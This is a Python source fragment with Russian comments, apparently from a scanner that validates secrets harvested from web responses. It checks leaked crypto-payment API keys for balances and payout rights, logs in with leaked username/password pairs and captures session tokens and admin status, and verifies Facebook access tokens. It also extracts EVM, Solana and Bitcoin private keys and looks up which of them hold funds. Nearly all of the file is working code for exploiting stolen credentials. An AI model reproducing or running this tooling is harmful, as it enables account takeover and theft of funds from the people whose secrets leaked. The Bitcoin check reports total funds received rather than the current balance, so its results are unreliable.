        b = obj.get("balance")
        if isinstance(b, (str, int, float)) and str(b).strip():
            tag = f"balance={b}"
            if tag not in out:
                out.append(tag)
        for v in obj.values():
            _walk_balance_fields(v, out, depth + 1)
    elif isinstance(obj, list):
        for v in obj:
            _walk_balance_fields(v, out, depth + 1)


async def verify_cryptopay_key(session: aiohttp.ClientSession, service: str,
                               key: str, merchant: str | None = None,
                               proxy: str | None = None,
                               timeout_s: float = 8.0) -> dict[str, Any]:
    """Read-only проверка ключа крипто-платёжки + баланс (выплаты возможны)."""
    result: dict[str, Any] = {"service": service, "key": key,
                              "status": "unknown", "detail": "", "balances": []}
    try:
        if service in ("heleket", "cryptomus"):
            if not merchant:
                result["detail"] = "нет merchant uuid"
                return result
            if service == "heleket":
                # sign = md5(base64("") + api_key) = md5(api_key), тело пустое
                url, body, sign = "https://api.heleket.com/v1/balance", "", _md5_hex(key)
            else:
                # cryptomus подписывает тело запроса "[]"
                url, body, sign = "https://api.cryptomus.com/v1/balance", "[]", _md5_hex("[]" + key)
            headers = {"merchant": merchant, "sign": sign,
                       "Content-Type": "application/json"}
            async with session.post(url, data=body.encode(), headers=headers,
                                   proxy=proxy, timeout=timeout_s) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if data.get("state") == 0:
                        bals: list[str] = []
                        _collect_balances(data.get("result"), bals)
                        result.update(status="valid", balances=bals[:8],
                                      detail=", ".join(bals[:5]) if bals else "баланс 0")
                    else:
                        result.update(status="invalid",
                                      detail=f"state={data.get('state')} {str(data.get('message') or '')[:40]}")
                elif resp.status in (401, 403, 422):
                    result.update(status="invalid", detail=f"HTTP {resp.status}")
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif service == "nowpayments":
            async with session.get(
                "https://api.nowpayments.io/v1/balance",
                headers={"x-api-key": key}, proxy=proxy, timeout=timeout_s,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    bals = []
                    _collect_balances(data, bals)
                    result.update(status="valid", balances=bals[:8],
                                  detail=", ".join(bals[:5]) if bals else "баланс 0")
                elif resp.status == 401:
                    result.update(status="invalid", detail="HTTP 401")
                elif resp.status == 403:
                    # невалидный ключ тоже даёт 403, но с code=INVALID_API_KEY
                    data = await resp.json(content_type=None)
                    if (data or {}).get("code") == "INVALID_API_KEY":
                        result.update(status="invalid", detail="неверный ключ")
                    else:
                        result.update(status="valid", detail="нет payout-прав")
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif service == "plisio":
            async with session.get(
                "https://plisio.net/api/v1/operations", params={"api_key": key},
                proxy=proxy, timeout=timeout_s,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if data.get("status") == "success":
                        bals: list[str] = []
                        _collect_balances(data.get("data"), bals)
                        result.update(status="valid", balances=bals[:8],
                                      detail=", ".join(bals[:5]) if bals else "доступ к операциям")
                    else:
                        result.update(status="invalid", detail=str(data.get("data"))[:40])
                elif resp.status in (401, 403, 422):
                    result.update(status="invalid", detail=f"HTTP {resp.status}")
                else:
                    result["detail"] = f"HTTP {resp.status}"
        else:
            result["detail"] = f"unknown service {service}"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Login-проверка: найденная пара логин+пароль пробуется на login-эндпоинте
# ОДНОЙ попыткой (не брутфорс - проверка утёкшего секрета). POST = side
# effect (создание сессии), одобрено юзером 2026-10-21.
# ---------------------------------------------------------------------------
LOGIN_VALID_TOKEN_RE = re.compile(
    r'"(?:access_token|token|jwt|session_id|session|refresh_token|sessionId)"\s*:\s*"[^"]{8,}"', re.I)
LOGIN_ADMIN_RE = re.compile(
    r'"(?:role|user_role|roles?)"\s*:\s*"?(?:admin|superadmin|super_admin|superuser)"?'
    r'|"(?:is_admin|is_superuser)"\s*:\s*(?:true|1)\b', re.I)
LOGIN_INVALID_RE = re.compile(r'(?i)(invalid|incorrect|wrong|unauthorized|ошиб|неверн)')


async def check_login(
    session: aiohttp.ClientSession, base_url: str, path: str,
    user: str, password: str,
    proxy: str | None = None, timeout_s: float = 10.0,
) -> dict[str, Any]:
    """Одна попытка login POST с УТЁКШЕЙ парой.

    200 + токен/профиль в ответе = валидный аккаунт (чекер).
    """
    result: dict[str, Any] = {
        "user": user, "password": password, "endpoint": path,
        "status": "error", "detail": "", "admin": False, "token": "",
    }
    body_fields = {"email": user, "password": password} if "@" in user \
        else {"username": user, "password": password}
    try:
        async with session.post(
            base_url.rstrip("/") + path, json=body_fields,
            headers={"Accept": "application/json"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                try:
                    data = await resp.json(content_type=None)
                except (ValueError, TypeError):
                    data = None
                text = json.dumps(data, ensure_ascii=False) if data is not None \
                    else (await resp.text())[:2000]
                m = LOGIN_VALID_TOKEN_RE.search(text)
                if m:
                    result["status"] = "valid"
                    tok_m = re.search(
                        r'"(?:access_token|token|jwt|session)"\s*:\s*"([^"]{8,})"', text, re.I)
                    if tok_m:
                        result["token"] = tok_m.group(1)
                    if LOGIN_ADMIN_RE.search(text):
                        result["admin"] = True
                    result["detail"] = f"login {user}" + (" — ADMIN" if result["admin"] else "")
                elif isinstance(data, dict) and (data.get("id") or data.get("user") or data.get("success")) \
                        and not LOGIN_INVALID_RE.search(text):
                    result["status"] = "valid"
                    result["detail"] = f"login {user} (профиль)"
                else:
                    result["status"] = "invalid"
                    result["detail"] = "нет токена/профиля в ответе"
            elif resp.status in (400, 401, 403, 422):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Facebook: EAA access-токены (аккаунты). Верификация read-only GET graph /me.
# ---------------------------------------------------------------------------
FACEBOOK_TOKEN_RE = re.compile(
    r'"(?:access_token|page_access_token)"\s*:\s*"(EAA[A-Za-z0-9]{50,})"')


def extract_facebook_tokens(text: str) -> list[str]:
    """EAA-токены из тел (аккаунты Facebook)."""
    return list(dict.fromkeys(FACEBOOK_TOKEN_RE.findall(text)))


async def verify_facebook(
    session: aiohttp.ClientSession, token: str,
    proxy: str | None = None, timeout_s: float = 8.0,
) -> dict[str, Any]:
    """GET graph.facebook.com/me (read-only) — живой аккаунт."""
    result: dict[str, Any] = {"token": token, "status": "error", "user": "", "detail": ""}
    try:
        async with session.get(
            "https://graph.facebook.com/me",
            params={"fields": "id,name,email", "access_token": token},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                if isinstance(data, dict) and data.get("id"):
                    result["status"] = "valid"
                    result["user"] = data.get("name") or str(data.get("id"))
                    result["detail"] = f"facebook {result['user']} ({data.get('id')})"
                else:
                    result["detail"] = "no id"
            elif resp.status in (400, 401, 403):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Крипто-ключи → адрес → бесплатный on-chain баланс (нативные монеты):
# publicnode (ETH/BSC), blockstream (BTC), api.mainnet-beta.solana.com
# (SOL - РЕАЛЬНЫЙ mainnet, legacy-имя). Pure-python b58/keccak/secp256k1/
# ed25519 - в docker-образе нет крипто-библиотек. Вся математика верифицирована
# против pycryptodome-keccak / ecdsa-secp256k1 / pynacl-ed25519 (2026-10-21).
# ---------------------------------------------------------------------------
import hashlib as _hl

_B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
_B58_INDEX = {c: i for i, c in enumerate(_B58_ALPHABET)}


def b58decode(s: str) -> bytes:
    n = 0
    for ch in s:
        n = n * 58 + _B58_INDEX[ch]
    body = n.to_bytes((n.bit_length() + 7) // 8, "big") if n else b""
    pad = len(s) - len(s.lstrip("1"))
    return b"\x00" * pad + body


def b58encode(b: bytes) -> str:
    n = int.from_bytes(b, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = _B58_ALPHABET[r] + out
    pad = len(b) - len(b.lstrip(b"\x00"))
    return "1" * pad + out


def _b58check_encode(payload: bytes) -> str:
    return b58encode(payload + _hl.sha256(_hl.sha256(payload).digest()).digest()[:4])


def _b58check_decode(s: str) -> bytes | None:
    raw = b58decode(s)
    if len(raw) < 5:
        return None
    payload, check = raw[:-4], raw[-4:]
    if _hl.sha256(_hl.sha256(payload).digest()).digest()[:4] != check:
        return None
    return payload


# keccak-f[1600] — дословная транскрипция PQClean/mldsa span-версии
_M64 = (1 << 64) - 1


def _rol(v: int, n: int) -> int:
    n &= 63
    if not n:
        return v
    return ((v << n) | (v >> (64 - n))) & _M64


_KRC = [
    0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
    0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
    0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
    0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
    0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
    0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008,
]


def _keccak_f(state: list) -> None:
    Aba, Abe, Abi, Abo, Abu = state[0:5]
    Aga, Age, Agi, Ago, Agu = state[5:10]
    Aka, Ake, Aki, Ako, Aku = state[10:15]
    Ama, Ame, Ami, Amo, Amu = state[15:20]
    Asa, Ase, Asi, Aso, Asu = state[20:25]

    for rnd in range(0, 24, 2):
        BCa = Aba ^ Aga ^ Aka ^ Ama ^ Asa
        BCe = Abe ^ Age ^ Ake ^ Ame ^ Ase
        BCi = Abi ^ Agi ^ Aki ^ Ami ^ Asi
        BCo = Abo ^ Ago ^ Ako ^ Amo ^ Aso
        BCu = Abu ^ Agu ^ Aku ^ Amu ^ Asu

        Da = BCu ^ _rol(BCe, 1)
        De = BCa ^ _rol(BCi, 1)
        Di = BCe ^ _rol(BCo, 1)
        Do = BCi ^ _rol(BCu, 1)
        Du = BCo ^ _rol(BCa, 1)

        Aba ^= Da
        BCa = Aba
        Age ^= De
        BCe = _rol(Age, 44)
        Aki ^= Di
        BCi = _rol(Aki, 43)
        Amo ^= Do
        BCo = _rol(Amo, 21)
        Asu ^= Du
        BCu = _rol(Asu, 14)
        Eba = BCa ^ ((~BCe) & _M64 & BCi)
        Eba ^= _KRC[rnd]
        Ebe = BCe ^ ((~BCi) & _M64 & BCo)
        Ebi = BCi ^ ((~BCo) & _M64 & BCu)
        Ebo = BCo ^ ((~BCu) & _M64 & BCa)
        Ebu = BCu ^ ((~BCa) & _M64 & BCe)

        Abo ^= Do
        BCa = _rol(Abo, 28)
        Agu ^= Du
        BCe = _rol(Agu, 20)
        Aka ^= Da
        BCi = _rol(Aka, 3)
        Ame ^= De
        BCo = _rol(Ame, 45)
        Asi ^= Di
        BCu = _rol(Asi, 61)
        Ega = BCa ^ ((~BCe) & _M64 & BCi)
        Ege = BCe ^ ((~BCi) & _M64 & BCo)
        Egi = BCi ^ ((~BCo) & _M64 & BCu)
        Ego = BCo ^ ((~BCu) & _M64 & BCa)
        Egu = BCu ^ ((~BCa) & _M64 & BCe)

        Abe ^= De
        BCa = _rol(Abe, 1)
        Agi ^= Di
        BCe = _rol(Agi, 6)
        Ako ^= Do
        BCi = _rol(Ako, 25)
        Amu ^= Du
        BCo = _rol(Amu, 8)
        Asa ^= Da
        BCu = _rol(Asa, 18)
        Eka = BCa ^ ((~BCe) & _M64 & BCi)
        Eke = BCe ^ ((~BCi) & _M64 & BCo)
        Eki = BCi ^ ((~BCo) & _M64 & BCu)
        Eko = BCo ^ ((~BCu) & _M64 & BCa)
        Eku = BCu ^ ((~BCa) & _M64 & BCe)

        Abu ^= Du
        BCa = _rol(Abu, 27)
        Aga ^= Da
        BCe = _rol(Aga, 36)
        Ake ^= De
        BCi = _rol(Ake, 10)
        Ami ^= Di
        BCo = _rol(Ami, 15)
        Aso ^= Do
        BCu = _rol(Aso, 56)
        Ema = BCa ^ ((~BCe) & _M64 & BCi)
        Eme = BCe ^ ((~BCi) & _M64 & BCo)
        Emi = BCi ^ ((~BCo) & _M64 & BCu)
        Emo = BCo ^ ((~BCu) & _M64 & BCa)
        Emu = BCu ^ ((~BCa) & _M64 & BCe)

        Abi ^= Di
        BCa = _rol(Abi, 62)
        Ago ^= Do
        BCe = _rol(Ago, 55)
        Aku ^= Du
        BCi = _rol(Aku, 39)
        Ama ^= Da
        BCo = _rol(Ama, 41)
        Ase ^= De
        BCu = _rol(Ase, 2)
        Esa = BCa ^ ((~BCe) & _M64 & BCi)
        Ese = BCe ^ ((~BCi) & _M64 & BCo)
        Esi = BCi ^ ((~BCo) & _M64 & BCu)
        Eso = BCo ^ ((~BCu) & _M64 & BCa)
        Esu = BCu ^ ((~BCa) & _M64 & BCe)

        BCa = Eba ^ Ega ^ Eka ^ Ema ^ Esa
        BCe = Ebe ^ Ege ^ Eke ^ Eme ^ Ese
        BCi = Ebi ^ Egi ^ Eki ^ Emi ^ Esi
        BCo = Ebo ^ Ego ^ Eko ^ Emo ^ Eso
        BCu = Ebu ^ Egu ^ Eku ^ Emu ^ Esu

        Da = BCu ^ _rol(BCe, 1)
        De = BCa ^ _rol(BCi, 1)
        Di = BCe ^ _rol(BCo, 1)
        Do = BCi ^ _rol(BCu, 1)
        Du = BCo ^ _rol(BCa, 1)

        Eba ^= Da
        BCa = Eba
        Ege ^= De
        BCe = _rol(Ege, 44)
        Eki ^= Di
        BCi = _rol(Eki, 43)
        Emo ^= Do
        BCo = _rol(Emo, 21)
        Esu ^= Du
        BCu = _rol(Esu, 14)
        Aba = BCa ^ ((~BCe) & _M64 & BCi)
        Aba ^= _KRC[rnd + 1]
        Abe = BCe ^ ((~BCi) & _M64 & BCo)
        Abi = BCi ^ ((~BCo) & _M64 & BCu)
        Abo = BCo ^ ((~BCu) & _M64 & BCa)
        Abu = BCu ^ ((~BCa) & _M64 & BCe)

        Ebo ^= Do
        BCa = _rol(Ebo, 28)
        Egu ^= Du
        BCe = _rol(Egu, 20)
        Eka ^= Da
        BCi = _rol(Eka, 3)
        Eme ^= De
        BCo = _rol(Eme, 45)
        Esi ^= Di
        BCu = _rol(Esi, 61)
        Aga = BCa ^ ((~BCe) & _M64 & BCi)
        Age = BCe ^ ((~BCi) & _M64 & BCo)
        Agi = BCi ^ ((~BCo) & _M64 & BCu)
        Ago = BCo ^ ((~BCu) & _M64 & BCa)
        Agu = BCu ^ ((~BCa) & _M64 & BCe)

        Ebe ^= De
        BCa = _rol(Ebe, 1)
        Egi ^= Di
        BCe = _rol(Egi, 6)
        Eko ^= Do
        BCi = _rol(Eko, 25)
        Emu ^= Du
        BCo = _rol(Emu, 8)
        Esa ^= Da
        BCu = _rol(Esa, 18)
        Aka = BCa ^ ((~BCe) & _M64 & BCi)
        Ake = BCe ^ ((~BCi) & _M64 & BCo)
        Aki = BCi ^ ((~BCo) & _M64 & BCu)
        Ako = BCo ^ ((~BCu) & _M64 & BCa)
        Aku = BCu ^ ((~BCa) & _M64 & BCe)

        Ebu ^= Du
        BCa = _rol(Ebu, 27)
        Ega ^= Da
        BCe = _rol(Ega, 36)
        Eke ^= De
        BCi = _rol(Eke, 10)
        Emi ^= Di
        BCo = _rol(Emi, 15)
        Eso ^= Do
        BCu = _rol(Eso, 56)
        Ama = BCa ^ ((~BCe) & _M64 & BCi)
        Ame = BCe ^ ((~BCi) & _M64 & BCo)
        Ami = BCi ^ ((~BCo) & _M64 & BCu)
        Amo = BCo ^ ((~BCu) & _M64 & BCa)
        Amu = BCu ^ ((~BCa) & _M64 & BCe)

        Ebi ^= Di
        BCa = _rol(Ebi, 62)
        Ego ^= Do
        BCe = _rol(Ego, 55)
        Eku ^= Du
        BCi = _rol(Eku, 39)
        Ema ^= Da
        BCo = _rol(Ema, 41)
        Ese ^= De
        BCu = _rol(Ese, 2)
        Asa = BCa ^ ((~BCe) & _M64 & BCi)
        Ase = BCe ^ ((~BCi) & _M64 & BCo)
        Asi = BCi ^ ((~BCo) & _M64 & BCu)
        Aso = BCo ^ ((~BCu) & _M64 & BCa)
        Asu = BCu ^ ((~BCa) & _M64 & BCe)

    state[0:25] = [Aba, Abe, Abi, Abo, Abu,
                   Aga, Age, Agi, Ago, Agu,
                   Aka, Ake, Aki, Ako, Aku,
                   Ama, Ame, Ami, Amo, Amu,
                   Asa, Ase, Asi, Aso, Asu]


def _keccak_pad(data: bytes, suffix: int) -> bytes:
    rate = 136
    pad = data + bytes([suffix])
    pad += b"\x00" * ((rate - len(pad) % rate) % rate)
    return pad[:-1] + bytes([pad[-1] | 0x80])


def keccak256(data: bytes) -> bytes:
    """Keccak-256 (Ethereum, паддинг 0x01)."""
    pad = _keccak_pad(data, 0x01)
    state = [0] * 25
    for off in range(0, len(pad), 136):
        blk = pad[off:off + 136]
        for i in range(17):
            state[i] ^= int.from_bytes(blk[8 * i:8 * i + 8], "little")
        _keccak_f(state)
    return b"".join(state[i].to_bytes(8, "little") for i in range(4))


# secp256k1 (EVM/Tron/BTC)
_SP = 2**256 - 2**32 - 977
_SG = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
       0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)


def _padd(P1, P2):
    if P1 is None:
        return P2
    if P2 is None:
        return P1
    x1, y1 = P1
    x2, y2 = P2
    if x1 == x2 and (y1 + y2) % _SP == 0:
        return None
    if P1 == P2:
        l = (3 * x1 * x1) * pow(2 * y1, _SP - 2, _SP) % _SP
    else:
        l = (y2 - y1) * pow(x2 - x1, _SP - 2, _SP) % _SP
    x3 = (l * l - x1 - x2) % _SP
    y3 = (l * (x1 - x3) - y1) % _SP
    return (x3, y3)


def _sec_mul(k: int):
    R = None
    for bit in bin(k)[2:]:
        R = _padd(R, R)
        if bit == "1":
            R = _padd(R, _SG)
    return R


def evm_pub65(priv: int) -> bytes:
    X, Y = _sec_mul(priv)
    return bytes([4]) + X.to_bytes(32, "big") + Y.to_bytes(32, "big")


def evm_address(priv: int) -> str:
    return "0x" + keccak256(evm_pub65(priv)[1:])[12:].hex()


# ed25519 (Solana): twisted a=-1, аффинное ПОЛНОЕ сложение (d не-квадрат)
_ED_P = 2**255 - 19
_ED_D = (-121665 * pow(121666, _ED_P - 2, _ED_P)) % _ED_P
_ED_BY = (4 * pow(5, _ED_P - 2, _ED_P)) % _ED_P
_ed_u = (_ED_BY * _ED_BY - 1) % _ED_P
_ed_v = (_ED_D * _ED_BY * _ED_BY + 1) % _ED_P
_ed_x2 = _ed_u * pow(_ed_v, _ED_P - 2, _ED_P) % _ED_P
_ed_x = pow(_ed_x2, (_ED_P + 3) // 8, _ED_P)
if (_ed_x * _ed_x - _ed_x2) % _ED_P:
    _ed_x = _ed_x * pow(2, (_ED_P - 1) // 4, _ED_P) % _ED_P
_ED_BX = _ed_x if _ed_x % 2 == 0 else _ED_P - _ed_x
_ED_B = (_ED_BX, _ED_BY)


def _ed_add(P1, P2):
    x1, y1 = P1
    x2, y2 = P2
    dx = (_ED_D * x1 * x2 * y1 * y2) % _ED_P
    x3 = (x1 * y2 + y1 * x2) * pow((1 + dx) % _ED_P, _ED_P - 2, _ED_P) % _ED_P
    y3 = (y1 * y2 + x1 * x2) * pow((1 - dx) % _ED_P, _ED_P - 2, _ED_P) % _ED_P
    return (x3, y3)


def _ed_mul(k: int):
    R = None
    for bit in bin(k)[2:]:
        R = _ed_add(R, R) if R is not None else None
        if bit == "1":
            R = _ed_add(R, _ED_B) if R is not None else _ED_B
    return R


def ed25519_pub(seed: bytes) -> bytes:
    h = _hl.sha512(seed).digest()
    a = int.from_bytes(h[:32], "little")
    a &= (2**254 - 8)
    a |= 2**254
    X, Y = _ed_mul(a)
    return (Y | ((X & 1) << 255)).to_bytes(32, "little")


# bitcoin WIF
def wif_decode(wif: str):
    payload = _b58check_decode(wif)
    if payload is None or len(payload) not in (33, 34) or payload[0] != 0x80:
        return None, None
    if len(payload) == 34:
        return int.from_bytes(payload[1:33], "big"), payload[33] == 0x01
    return int.from_bytes(payload[1:33], "big"), False


def btc_address(priv: int, compressed: bool) -> str:
    X, Y = _sec_mul(priv)
    pub = (bytes([2 | (Y & 1)]) + X.to_bytes(32, "big")) if compressed else \
          (bytes([4]) + X.to_bytes(32, "big") + Y.to_bytes(32, "big"))
    h160 = _hl.new("ripemd160", _hl.sha256(pub).digest()).digest()
    return _b58check_encode(b"\x00" + h160)


# --- экстракторы: копии чекерских паттернов + захват значения
# (без границ - иначе extractor разойдётся с детектором = "ghost finding") ---
CRYPTO_EVM_KEY_RE = re.compile(
    r'"(?:[^"]{0,32}(?:priv|wallet|owner|signer|evm|eth|tron|deployer|keeper|hot|funder)[^"]{0,24}key|pk)"'
    r'\s*:\s*"(?:0x)?([0-9a-fA-F]{64})"', re.I)
CRYPTO_SOLANA_KEY_RE = re.compile(
    r'"[^"]{0,32}(?:priv|secret|solana|wallet)[^"]{0,24}key"'
    r'\s*:\s*"([1-9A-HJ-NP-Za-km-z]{87,88})"', re.I)
CRYPTO_WIF_KEY_RE = re.compile(
    r'"[^"]{0,24}(?:wif|priv)[^"]{0,20}"'
    r'\s*:\s*"([5KL][1-9A-HJ-NP-Za-km-z]{50,51})"', re.I)


def _is_junk_hex(v: str) -> bool:
    return len(set(v.lower())) < 4


def extract_crypto_keys(text: str) -> list[dict[str, str]]:
    """Ключи (kind, value) из тел: evm 64hex / solana 64B-b58 / bitcoin WIF.

    87-88 b58 = 64 байта (Phantom-экспорт seed+pub). Мусор (нули/односимв.)
    и битые b58/WIF-чексуммы отфильтрованы.
    """
    out: list[dict[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for m in CRYPTO_EVM_KEY_RE.finditer(text):
        v = m.group(1)
        if _is_junk_hex(v) or ("evm", v) in seen:
            continue
        seen.add(("evm", v))
        out.append({"kind": "evm", "value": v})
    for m in CRYPTO_SOLANA_KEY_RE.finditer(text):
        v = m.group(1)
        raw = b58decode(v)
        if len(raw) == 64 and len(set(raw)) > 3 and ("solana", v) not in seen:
            seen.add(("solana", v))
            out.append({"kind": "solana", "value": v})
    for m in CRYPTO_WIF_KEY_RE.finditer(text):
        v = m.group(1)
        priv, _comp = wif_decode(v)
        if priv is not None and priv > 1 and ("wif", v) not in seen:
            seen.add(("wif", v))
            out.append({"kind": "wif", "value": v})
    return out


KEY_BALANCE_CHAINS = (
    ("eth", "https://ethereum-rpc.publicnode.com"),
    ("bsc", "https://bsc-rpc.publicnode.com"),
)


async def check_key_balance(
    session: aiohttp.ClientSession, kind: str, value: str,
    proxy: str | None = None, timeout_s: float = 12.0,
) -> dict[str, Any]:
    """Ключ → адрес → БЕСПЛАТНЫЙ on-chain баланс нативных монет.

    Только read-only RPC. Баланс > 0 = деньги на ключе (private_key_money).
    """
    result: dict[str, Any] = {
        "kind": kind, "key": value, "address": "", "balances": {},
        "total": 0.0, "status": "error", "detail": "",
    }
    try:
        if kind == "evm":
            addr = evm_address(int(value, 16))
            result["address"] = addr
            for chain, url in KEY_BALANCE_CHAINS:
                async with session.post(
                    url,
                    json={"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
                          "params": [addr, "latest"]},
                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
                ) as resp:
                    if resp.status == 200:
                        d = await resp.json(content_type=None)
                        wei = int((d or {}).get("result") or "0", 16)
                        bal = round(wei / 1e18, 8)
                        if bal > 0:
                            result["balances"][chain] = bal
        elif kind == "solana":
            raw = b58decode(value)
            seed, stated_pub = raw[:32], raw[32:]
            pub = ed25519_pub(seed)
            if stated_pub and stated_pub != pub:
                result["status"] = "mismatch"
                result["detail"] = "заявленный pubkey не сходится с ключом"
                return result
            addr = b58encode(pub)
            result["address"] = addr
            async with session.post(
                "https://api.mainnet-beta.solana.com",
                json={"jsonrpc": "2.0", "id": 1, "method": "getBalance",
                      "params": [addr]},
                proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
            ) as resp:
                if resp.status == 200:
                    d = await resp.json(content_type=None)
                    lam = int(((d or {}).get("result") or {}).get("value") or 0)
                    bal = round(lam / 1e9, 9)
                    if bal > 0:
                        result["balances"]["sol"] = bal
        elif kind == "wif":
            priv, compressed = wif_decode(value)
            if priv is None:
                result["status"] = "mismatch"
                result["detail"] = "битый WIF"
                return result
            addr = btc_address(priv, compressed)
            result["address"] = addr
            async with session.get(
                f"https://blockstream.info/api/address/{addr}",
                proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
            ) as resp:
                if resp.status == 200:
                    d = await resp.json(content_type=None)
                    sats = int(((d or {}).get("chain_stats") or {}).get("funded_txo_sum") or 0)
                    bal = round(sats / 1e8, 8)
                    if bal > 0:
                        result["balances"]["btc"] = bal
        total = round(sum(result["balances"].values()), 9)
        result["total"] = total
        if total > 0:
            result["status"] = "balance"
            chains = "+".join(f"{v} {k.upper()}" for k, v in result["balances"].items())
            result["detail"] = f"{result['address']} balance: {total} ({chains})"
        else:
            result["status"] = "empty"
            result["detail"] = f"{result['address']} — нативные монеты: 0"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result
